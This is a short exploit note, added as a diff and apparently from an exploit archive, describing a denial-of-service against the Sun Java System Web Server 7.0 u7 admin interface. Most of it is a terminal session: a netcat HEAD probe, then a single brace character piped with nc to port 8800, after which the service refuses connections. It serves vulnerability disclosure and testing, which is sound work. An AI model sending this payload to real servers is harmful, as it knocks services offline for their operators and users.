@@ -1,0 +1,25 @@
+# Sun Java Web Sever 7.0 u7 Admin Interface DOS
+
+# Software Package sjsws-7_0u7-windows-i586.zip 4fb8d1fb700d5649234a2891a4ecedea
+# While attempting to verify http://www.exploit-db.com/exploits/14194/ (which was not verified),
+# I stumbled across this semi amusing DOS:
+
+root@bt:~# nc -nv 192.168.48.134 8800
+(UNKNOWN) [192.168.48.134] 8800 (?) open
+HEAD / HTTP/1.0
+
+HTTP/1.1 200 OK
+Server: Sun-Java-System-Web-Server/7.0
+Date: Tue, 06 Jul 2010 00:22:50 GMT
+Content-type: text/html
+Last-modified: Tue, 06 Jul 2010 00:18:00 GMT
+Content-length: 465
+Etag: "1d1-4c327638"
+Accept-ranges: bytes
+Connection: close
+
+root@bt:~# echo { |nc -nv 192.168.48.134 8800
+(UNKNOWN) [192.168.48.134] 8800 (?) open
+root@bt:~# echo { |nc -nv 192.168.48.134 8800
+(UNKNOWN) [192.168.48.134] 8800 (?) : Connection refused
+root@bt:~#
